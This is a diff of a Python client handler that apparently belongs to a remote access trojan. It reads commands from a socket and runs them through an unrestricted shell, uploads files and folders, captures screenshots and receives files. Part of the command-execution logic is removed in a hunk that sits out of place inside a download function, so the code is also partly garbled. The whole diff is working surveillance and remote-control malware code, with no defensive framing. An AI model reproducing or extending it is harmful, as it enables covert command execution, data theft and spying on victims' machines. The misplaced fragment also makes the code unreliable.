@@ -1,6 +1,5 @@
 import subprocess
 import os
-#from filedownload import *
 from clientfileupload import * 
 from screenshot import * 
              
@@ -9,6 +8,7 @@ def clienthandler(my_socket):
      while True :
          cmd = my_socket.recv_data()
          print(f"[+] User Data : {cmd}")
+
          if cmd == "1" or cmd == "01":
              print("[+] Running System Commands")
              #run system command
@@ -21,6 +21,7 @@ def clienthandler(my_socket):
               
          if cmd == "03" or cmd =="3":
              upload_file_folder(my_socket)
+
          if cmd == "04" or cmd =="4":
              capture_screenshot(my_socket)
          
@@ -68,15 +69,6 @@ def download_file(my_socket):
      filename=my_socket.recv_data()
      my_socket.recv_file(filename)
      
-
-             my_socket.send_data(runshell("pwd"))
-             
-         if cmd[:5] =="chdir":
-             os.chdir(cmd[6:])
-             my_socket.send_data(runshell("pwd"))
-         else :
-             res = runshell(cmd)
-             my_socket.send_results(res)
              
 def runshell(cmd):
      output = subprocess.run(cmd , shell=True, capture_output=True)
@@ -91,4 +83,3 @@ def download_file(my_socket):
      print("[+] Downloading File")
      filename=my_socket.recv_data()
      my_socket.recv_file(filename)
-     
